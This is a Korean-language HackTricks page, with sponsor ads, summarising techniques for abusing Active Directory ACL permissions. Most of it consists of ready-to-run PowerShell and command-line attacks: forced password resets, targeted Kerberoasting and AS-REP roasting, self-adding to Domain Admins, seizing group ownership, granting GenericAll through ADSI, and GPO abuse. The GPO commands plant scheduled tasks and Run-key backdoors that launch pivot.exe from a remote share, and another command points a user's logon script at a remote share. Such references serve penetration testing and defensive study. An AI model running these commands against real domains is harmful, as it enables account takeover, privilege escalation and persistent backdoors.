# Active Directory ACLs/ACEs 남용하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출**하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**이 페이지는 주로 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) 및 [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)의 기술 요약입니다. 자세한 내용은 원본 기사를 확인하세요.**


## **사용자에 대한 GenericAll 권한**
이 권한은 공격자에게 대상 사용자 계정에 대한 완전한 제어 권한을 부여합니다. `Get-ObjectAcl` 명령을 사용하여 `GenericAll` 권한이 확인된 후, 공격자는 다음을 수행할 수 있습니다:

- **대상의 비밀번호 변경**: `net user <username> <password> /domain`을 사용하여 사용자의 비밀번호를 재설정할 수 있습니다.
- **대상 지정된 Kerberoasting**: 사용자 계정에 SPN을 할당하여 kerberoasting이 가능하게 만든 다음, Rubeus와 targetedKerberoast.py를 사용하여 티켓 발급 티켓(TGT) 해시를 추출하고 크랙을 시도할 수 있습니다.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **대상화된 ASREPRoasting**: 사용자의 사전 인증을 비활성화하여 계정이 ASREPRoasting에 취약해지도록 만듭니다.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **그룹에 대한 GenericAll 권한**
이 권한을 가진 공격자는 `Domain Admins`와 같은 그룹에 대해 `GenericAll` 권한을 가지고 있다면 그룹 멤버십을 조작할 수 있습니다. `Get-NetGroup`을 사용하여 그룹의 식별 이름을 확인한 후, 공격자는 다음을 수행할 수 있습니다:

- **자신을 Domain Admins 그룹에 추가**: 이는 직접 명령을 사용하거나 Active Directory 또는 PowerSploit과 같은 모듈을 사용하여 수행할 수 있습니다.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
컴퓨터 객체나 사용자 계정에 이러한 권한을 가지고 있다면 다음과 같은 작업을 수행할 수 있습니다:

- **Kerberos 기반 제한된 위임**: 컴퓨터 객체를 탈취하는 것이 가능합니다.
- **그림자 자격 증명**: 그림자 자격 증명을 생성하여 컴퓨터나 사용자 계정을 가장할 수 있는 권한을 악용할 수 있습니다.

## **WriteProperty on Group**
특정 그룹 (예: `Domain Admins`)의 모든 객체에 대해 사용자가 `WriteProperty` 권한을 가지고 있다면 다음을 수행할 수 있습니다:

- **도메인 관리자 그룹에 자신 추가**: `net user`와 `Add-NetGroupUser` 명령을 조합하여 이 방법을 사용하여 도메인 내에서 권한 상승이 가능합니다.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **그룹에서의 자체 (자체 멤버십)**
이 권한을 통해 공격자는 그룹 멤버십을 직접 조작하는 명령을 통해 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있습니다. 다음 명령 순서를 사용하여 자체 추가가 가능합니다:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (자체 멤버십)**
비슷한 권한으로, 공격자는 해당 그룹에 대한 `WriteProperty` 권한이 있는 경우 그룹 속성을 수정하여 직접 그룹에 자신을 추가할 수 있습니다. 이 권한의 확인과 실행은 다음과 같이 수행됩니다:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
사용자에 대한 `User-Force-Change-Password`의 `ExtendedRight`를 보유하면 현재 비밀번호를 알지 못해도 비밀번호를 재설정할 수 있습니다. 이 권한의 확인과 악용은 PowerShell이나 대체 명령줄 도구를 통해 수행할 수 있으며, 상호 작용 세션 및 비대화식 환경에 대한 원라이너를 포함하여 사용자의 비밀번호를 재설정하는 여러 가지 방법을 제공합니다. 명령은 간단한 PowerShell 호출부터 Linux에서 `rpcclient`를 사용하는 것까지 다양한 공격 벡터의 다양성을 보여줍니다.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **그룹에 WriteOwner 적용**
공격자가 그룹에 `WriteOwner` 권한을 가지고 있다는 것을 발견하면, 그룹의 소유권을 자신으로 변경할 수 있습니다. 이는 특히 그룹이 `Domain Admins`인 경우에 영향력이 큽니다. 소유권을 변경함으로써 그룹 속성과 멤버십에 대한 더 넓은 제어가 가능해집니다. 이 과정은 `Get-ObjectAcl`을 통해 올바른 개체를 식별한 다음, `Set-DomainObjectOwner`를 사용하여 소유자를 SID 또는 이름으로 수정하는 것을 포함합니다.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **사용자에 대한 GenericWrite**
이 권한은 공격자가 사용자 속성을 수정할 수 있게 합니다. 특히 `GenericWrite` 액세스를 통해 공격자는 사용자 로그온 시 악성 스크립트를 실행하기 위해 사용자의 로그온 스크립트 경로를 변경할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **그룹에 대한 GenericWrite**
이 권한을 가지고 있으면 공격자는 그룹 멤버십을 조작할 수 있습니다. 예를 들어 특정 그룹에 자신이나 다른 사용자를 추가하는 것과 같은 작업을 수행할 수 있습니다. 이 과정은 자격 증명 개체를 생성하고, 해당 개체를 사용하여 그룹에서 사용자를 추가하거나 제거하며, PowerShell 명령을 사용하여 멤버십 변경을 확인하는 것을 포함합니다.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
AD 객체를 소유하고 해당 객체에 대한 `WriteDACL` 권한을 가지는 것은 공격자가 해당 객체에 대해 `GenericAll` 권한을 부여할 수 있게 합니다. 이는 ADSI 조작을 통해 수행되며, 객체에 대한 완전한 제어와 그룹 멤버십 수정이 가능합니다. 그럼에도 불구하고, Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용하여 이러한 권한을 악용하려고 할 때 제한 사항이 존재합니다.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **도메인 복제 (DCSync)**
DCSync 공격은 도메인에서 특정 복제 권한을 활용하여 도메인 컨트롤러를 모방하고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기술은 `DS-Replication-Get-Changes`와 같은 권한을 필요로 하며, 공격자는 도메인 컨트롤러에 직접 액세스하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있습니다.
[**DCSync 공격에 대해 자세히 알아보세요.**](../dcsync.md)

## GPO 위임 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 위임

그룹 정책 개체(GPO)를 관리하기 위해 위임된 액세스는 중요한 보안 위험을 초래할 수 있습니다. 예를 들어, `offense\spotless`와 같은 사용자가 GPO 관리 권한을 위임받으면 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 권한을 가질 수 있습니다. 이러한 권한은 악의적인 목적으로 남용될 수 있으며, PowerView를 사용하여 식별할 수 있습니다:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### GPO 권한 열거

잘못 구성된 GPO를 식별하기 위해 PowerSploit의 cmdlet을 연결하여 사용자가 관리할 수 있는 GPO를 발견할 수 있습니다:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**특정 정책이 적용된 컴퓨터**: 특정 GPO가 적용된 컴퓨터를 확인하여 잠재적인 영향 범위를 이해하는 데 도움이 됩니다.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 적용된 정책을 확인하기 위해 `Get-DomainGPO`와 같은 명령을 사용할 수 있습니다.

**특정 정책이 적용된 OU**: 특정 정책에 영향을 받는 조직 단위(OU)를 식별하기 위해 `Get-DomainOU`를 사용할 수 있습니다.

### GPO 남용 - New-GPOImmediateTask

잘못 구성된 GPO를 악용하여 코드를 실행할 수 있습니다. 예를 들어, 즉시 예약된 작업을 생성하여 영향을 받는 기기의 로컬 관리자 그룹에 사용자를 추가할 수 있으며, 이는 권한을 크게 상승시킵니다.
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy 모듈 - GPO 남용

GroupPolicy 모듈은 설치된 경우 새로운 GPO를 생성하고 연결하며, 영향을 받는 컴퓨터에서 백도어를 실행하기 위해 레지스트리 값을 설정하는 것을 가능하게 합니다. 이 방법은 GPO를 업데이트하고 사용자가 컴퓨터에 로그인하여 실행되어야 합니다:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO 남용

SharpGPOAbuse는 기존의 GPO를 남용하기 위한 방법을 제공합니다. 새로운 GPO를 생성할 필요 없이 작업을 추가하거나 설정을 수정할 수 있습니다. 이 도구는 변경 사항을 적용하기 전에 기존의 GPO를 수정하거나 RSAT 도구를 사용하여 새로운 GPO를 생성해야 합니다.
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 정책 강제 업데이트

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 특히 변경 사항을 적용한 후에는 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉시 정책 업데이트를 강제로 실행할 수 있습니다. 이 명령은 GPO에 대한 수정 사항이 다음 자동 업데이트 주기를 기다리지 않고 적용되도록 보장합니다.

### 내부 동작

`Misconfigured Policy`와 같은 특정 GPO의 예약된 작업을 검사하면 `evilTask`와 같은 작업이 추가되었는지 확인할 수 있습니다. 이러한 작업은 시스템 동작을 수정하거나 권한을 상승시키기 위해 스크립트나 명령 줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`에 의해 생성된 XML 구성 파일에서 작업의 구조는 예약된 작업의 세부 정보를 개요로 제공합니다. 이 파일은 GPO 내에서 예약된 작업이 정의되고 관리되는 방식을 나타내며, 정책 강제 적용의 일부로 임의의 명령이나 스크립트를 실행하기 위한 방법을 제공합니다.

### 사용자 및 그룹

GPO는 대상 시스템에서 사용자 및 그룹 멤버십을 조작할 수도 있습니다. 공격자는 Users and Groups 정책 파일을 직접 편집함으로써 사용자를 로컬 `administrators` 그룹과 같은 특권 그룹에 추가할 수 있습니다. 이는 GPO 관리 권한 위임을 통해 가능하며, 정책 파일을 수정하여 새로운 사용자를 추가하거나 그룹 멤버십을 변경할 수 있도록 허용합니다.

Users and Groups에 대한 XML 구성 파일은 이러한 변경 사항이 어떻게 구현되는지 개요로 제공합니다. 이 파일에 항목을 추가함으로써 특정 사용자에게 영향을 미치는 시스템 전체에서 특권이 부여될 수 있습니다. 이 방법은 GPO 조작을 통해 특권 상승에 대한 직접적인 접근 방법을 제공합니다.

또한 로그온/로그오프 스크립트를 활용하거나 자동 실행을 위한 레지스트리 키 수정, .msi 파일을 통한 소프트웨어 설치, 서비스 구성 수정 등 코드 실행 또는 지속성 유지를 위한 추가적인 방법도 고려할 수 있습니다. 이러한 기술은 GPO 남용을 통해 액세스를 유지하고 대상 시스템을 제어하기 위한 다양한 경로를 제공합니다.



## 참고 자료

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정하세요. Intruder는 공격 표면을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
